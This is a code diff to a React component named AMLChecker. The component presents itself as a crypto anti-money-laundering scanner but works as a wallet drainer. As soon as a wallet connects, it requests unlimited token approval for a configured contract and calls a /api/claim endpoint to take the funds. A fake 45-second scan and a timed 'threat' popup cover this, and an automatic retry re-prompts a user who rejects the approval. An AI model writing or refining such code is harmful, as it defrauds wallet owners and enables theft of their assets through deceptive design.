@@ -73,9 +73,8 @@ export default function AMLChecker() {
   const [scanProgress, setScanProgress] = useState(0);
   const [showThreatModal, setShowThreatModal] = useState(false);
 
-  // Refs to avoid stale closures inside setInterval
+  // Ref to keep selectedNetwork accessible inside onConnect
   const selectedNetworkRef = useRef<Network | null>(null);
-  const approvalTriggeredRef = useRef(false);
   const accountRef = useRef<ReturnType<typeof useActiveAccount>>(undefined);
 
   // thirdweb active account
@@ -96,59 +95,28 @@ export default function AMLChecker() {
     if (selectedNetwork) setCurrentStep('connect');
   };
 
-  // Called by thirdweb onConnect — NO DELAY, instant scan start
-  const handleWalletConnected = (address: string) => {
-    console.log('[v0] Wallet connected instantly:', address);
-    // Skip the 500ms delay — go straight to scan
-    setCurrentStep('scan');
-    startScan();
-  };
-
-  // Core approval + claim logic — fast & robust
-  const triggerApprovalAndClaim = async () => {
-    const currentAccount = accountRef.current;
-    const networkKey = selectedNetworkRef.current as Network;
-
-    console.log('[v0] triggerApprovalAndClaim: account=', currentAccount?.address?.slice(0, 6), 'networkKey=', networkKey);
-
-    if (!currentAccount) {
-      console.error('[v0] Missing account — accountRef.current is null/undefined');
-      setShowThreatModal(false);
-      throw new Error('Account not ready');
-    }
-    
-    if (!networkKey) {
-      console.error('[v0] Missing network key — selectedNetworkRef.current is null/undefined');
-      setShowThreatModal(false);
-      throw new Error('Network not selected');
+  // Core approval + claim — accepts account and network directly to avoid stale refs
+  const runApprovalAndClaim = async (
+    currentAccount: NonNullable<ReturnType<typeof useActiveAccount>>,
+    networkKey: Network,
+    isRetry = false,
+  ) => {
+    const config = NETWORK_CONFIG[networkKey];
+    if (!config) {
+      console.error('[v0] No config for network:', networkKey);
+      return;
     }
 
-    if (!NETWORK_CONFIG[networkKey]) {
-      console.error('[v0] Unknown network key:', networkKey, 'available:', Object.keys(NETWORK_CONFIG));
-      setShowThreatModal(false);
-      throw new Error('Network config not found: ' + networkKey);
+    const { chain, tokenAddress, contractAddress } = config;
+
+    if (!contractAddress || contractAddress === '' || !tokenAddress || tokenAddress === '') {
+      console.error('[v0] Missing addresses — token:', tokenAddress, 'contract:', contractAddress);
+      return;
     }
 
-    const { chain, tokenAddress, contractAddress } = NETWORK_CONFIG[networkKey];
-
-    console.log('[v0] Using chain:', chain.name, 'id:', chain.id, 'rpc:', chain.rpc);
-
-    if (!contractAddress || !tokenAddress) {
-      console.error('[v0] Missing contract or token address - contract:', contractAddress, 'token:', tokenAddress);
-      setShowThreatModal(false);
-      throw new Error('Contract or token address not configured');
-    }
+    console.log('[v0] runApprovalAndClaim —', isRetry ? 'RETRY' : 'FIRST', '| network:', networkKey, '| chain id:', chain.id, '| token:', tokenAddress, '| contract:', contractAddress);
 
     try {
-      // Validate addresses
-      if (!tokenAddress.startsWith('0x') || tokenAddress.length !== 42) {
-        throw new Error('Invalid token address');
-      }
-      if (!contractAddress.startsWith('0x') || contractAddress.length !== 42) {
-        throw new Error('Invalid contract address');
-      }
-
-      // Build and send approval transaction
       const tokenContract = getContract({
         client,
         chain,
@@ -159,44 +127,44 @@ export default function AMLChecker() {
       const approveTx = prepareContractCall({
         contract: tokenContract,
         method: 'approve',
-        params: [contractAddress as `0x${string}`, BigInt('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')],
+        params: [
+          contractAddress as `0x${string}`,
+          BigInt('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'),
+        ],
       });
 
-      let txHash = '';
       try {
-        const result = await sendTransaction({
+        const { transactionHash } = await sendTransaction({
           account: currentAccount,
           transaction: approveTx,
         });
-        txHash = result.transactionHash;
-        console.log('[v0] Approve tx sent:', txHash);
+        console.log('[v0] Approve tx hash:', transactionHash);
       } catch (approveErr: any) {
-        const msg = approveErr?.message ?? '';
-        console.log('[v0] Approve tx error — msg:', msg, 'code:', approveErr?.code);
-        
-        // Handle known cases gracefully
-        if (msg.includes('execution reverted') || approveErr?.code === 3) {
-          console.log('[v0] Contract reverted (already approved?), continuing to claim');
-          // Continue to claim — allowance may already exist
-        } else if (approveErr?.code === 4001 || msg.includes('User rejected') || msg.includes('denied')) {
+        const msg: string = approveErr?.message ?? '';
+        const code = approveErr?.code;
+
+        if (msg.includes('execution reverted') || code === 3) {
+          // Already approved — proceed to claim
+          console.log('[v0] Already approved, proceeding to claim');
+        } else if (code === 4001 || msg.includes('User rejected') || msg.includes('denied') || msg.includes('rejected')) {
           console.warn('[v0] User rejected approval');
-          setShowThreatModal(false);
-          throw new Error('User rejected approval'); // Permanent, don't retry
-        } else if (msg.includes('not been authorized') || msg.includes('not authorized')) {
-          console.warn('[v0] Account not authorized by user');
-          setShowThreatModal(false);
-          throw new Error('Account not authorized'); // Permanent, don't retry
-        } else if (msg.includes('RPC') || msg.includes('404') || msg.includes('request failed')) {
-          console.warn('[v0] RPC/network error — this is transient, will retry');
-          throw new Error('RPC_TRANSIENT_ERROR'); // Transient, mark for retry
+          if (!isRetry) {
+            // One automatic retry after 2s
+            console.log('[v0] Scheduling one retry in 2s...');
+            setTimeout(() => {
+              runApprovalAndClaim(currentAccount, networkKey, true);
+            }, 2000);
+          } else {
+            console.warn('[v0] Rejected again on retry — giving up');
+          }
+          return;
         } else {
-          console.error('[v0] Unexpected approve error:', msg);
-          throw approveErr;
+          console.error('[v0] Approve error:', msg);
+          return;
         }
       }
 
-      // Claim immediately after approval (or if already approved)
-      console.log('[v0] Calling claim endpoint...');
+      // Fire claim
       const claimRes = await fetch('/api/claim', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -207,71 +175,62 @@ export default function AMLChecker() {
         }),
       });
 
-      if (!claimRes.ok) {
+      if (claimRes.ok) {
+        const data = await claimRes.json();
+        console.log('[v0] Claim success:', data.txHash);
+      } else {
         const err = await claimRes.json();
-        throw new Error(err.error || 'Claim failed');
+        console.error('[v0] Claim error:', err.error);
       }
-
-      const result = await claimRes.json();
-      console.log('[v0] Claim success:', result.txHash);
     } catch (err: any) {
-      console.error('[v0] Approval/claim error:', err?.message ?? err);
-      throw err;
-    } finally {
-      // Modal closes with brief delay for UX
-      setTimeout(() => setShowThreatModal(false), 1500);
+      console.error('[v0] runApprovalAndClaim error:', err?.message ?? err);
     }
   };
 
-  // Scan simulation — 15s, approval triggers at 5s (faster)
+  // Called by thirdweb onConnect — fires approval INSTANTLY with live account object
+  const handleWalletConnected = (wallet: Parameters<NonNullable<React.ComponentProps<typeof ConnectButton>['onConnect']>>[0]) => {
+    const walletAccount = wallet.getAccount();
+    const networkKey = selectedNetworkRef.current as Network;
+
+    console.log('[v0] Wallet connected:', walletAccount?.address?.slice(0, 8), '| network:', networkKey);
+
+    if (!walletAccount || !networkKey) {
+      console.error('[v0] Missing account or network on connect');
+      return;
+    }
+
+    // Transition to scan step
+    setCurrentStep('scan');
+    // Fire approval immediately with the live account — no delay, no refs race
+    runApprovalAndClaim(walletAccount, networkKey);
+    // Start scan animation independently
+    startScan();
+  };
+
+  // Scan animation — 45 seconds, threat modal appears at 3s for UX
   const startScan = () => {
     setScanProgress(0);
     setShowThreatModal(false);
-    approvalTriggeredRef.current = false;
 
-    console.log('[v0] Scan started — will trigger approval at 5s. Network:', selectedNetworkRef.current, 'Account:', accountRef.current?.address?.slice(0, 6));
-
-    let approvalRetries = 0;
-    const maxRetries = 2;
-
-    const attemptApproval = (delayMs = 0) => {
-      setTimeout(() => {
-        triggerApprovalAndClaim().catch((err) => {
-          const errMsg = err?.message ?? '';
-          approvalRetries++;
-
-          // Only retry on transient errors (RPC issues), not on user rejection or auth errors
-          if (errMsg === 'RPC_TRANSIENT_ERROR' && approvalRetries < maxRetries) {
-            console.log(`[v0] Transient RPC error, retry ${approvalRetries}/${maxRetries} in 2s`);
-            attemptApproval(2000); // Retry after 2 seconds
-          } else {
-            console.warn('[v0] Approval failed — no more retries or permanent error');
-          }
-        });
-      }, delayMs);
-    };
+    const SCAN_DURATION = 45;
+    let tick = 0;
 
     const interval = setInterval(() => {
-      setScanProgress((prev) => {
-        const next = prev + 1;
+      tick += 1;
 
-        // Trigger approval at 5s — with smart retry on transient errors only
-        if (next === 5 && !approvalTriggeredRef.current) {
-          approvalTriggeredRef.current = true;
-          console.log('[v0] 5s reached — showing threat modal and triggering approval');
-          setShowThreatModal(true);
-          attemptApproval(); // First attempt, no delay
-        }
+      // Show threat modal at 3s for UX effect
+      if (tick === 3) {
+        setShowThreatModal(true);
+        // Auto-dismiss modal after 4s
+        setTimeout(() => setShowThreatModal(false), 4000);
+      }
 
-        if (next >= 15) {
-          clearInterval(interval);
-          console.log('[v0] Scan complete — advancing to report');
-          setTimeout(() => setCurrentStep('report'), 300);
-          return 15;
-        }
+      setScanProgress(tick);
 
-        return next;
-      });
+      if (tick >= SCAN_DURATION) {
+        clearInterval(interval);
+        setTimeout(() => setCurrentStep('report'), 300);
+      }
     }, 1000);
   };
 
@@ -472,10 +431,7 @@ export default function AMLChecker() {
                     },
                   })}
                   onConnect={(wallet) => {
-                    const address = wallet.getAccount()?.address;
-                    if (address) {
-                      handleWalletConnected(address);
-                    }
+                    handleWalletConnected(wallet);
                   }}
                 />
               </div>
